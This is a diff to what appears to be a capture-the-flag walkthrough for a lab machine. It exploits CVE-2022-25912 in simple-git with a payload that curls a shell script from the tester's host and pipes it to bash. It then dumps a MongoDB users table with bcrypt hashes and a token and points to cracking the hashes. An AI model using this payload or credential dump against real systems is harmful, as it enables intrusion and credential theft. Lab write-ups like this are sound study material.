@@ -117,3 +117,25 @@ V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsg
 
 - add this domain into `/etc/hosts`.type:  `echo "10.10.11.6 dev-git-auto-update.chatbot.htb"  | sudo tee -a /etc/hosts`. goto that site!
 ...
+
+This page use `simple-git v3.14`, use can search internet this! It show [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221).
+I inject the payload by bash code though this vuls!.
+`ext::sh -c curl% http://10.10.14.18:8888/shell.sh|bash`
+
+![img 3](./img/img3.png)
+
+- This project use mongodb, you type `mongo`  -> yah, from this you can interact with db, you can read the project, it is using testing db to save -> `use testing`.
+```shell
+use testing
+switched to db testing
+show collections
+messages
+users
+db.users.find()
+{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAyNDk2ODJ9.GW97zDBRfK4goXJakZ0WgqKBLj_CVpW_ir1mNXnp1-4", "__v" : 0 }
+{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
+``` 
+
+The frank_dorky's password is encode, this is `bcrypt`. John or hashcat to decode it.
+![img4](./img/img4.png) 
+
